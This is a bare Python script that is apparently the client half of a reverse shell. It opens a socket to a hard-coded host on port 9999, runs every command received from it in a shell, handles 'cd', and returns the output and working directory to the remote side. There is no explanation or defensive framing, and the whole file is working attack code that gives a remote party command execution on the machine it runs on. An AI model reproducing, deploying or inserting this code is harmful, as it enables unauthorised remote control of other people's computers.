#!/usr/bin/env python3
import os
import socket
import subprocess


sock = socket.socket()
host = "192.168._._"
port = 9999

sock.connect((host, port))

while True:
    data = sock.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True,
                               stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        current_wd = os.getcwd() + "> "
        sock.send(str.encode(output_str + current_wd))

        print(output_str)
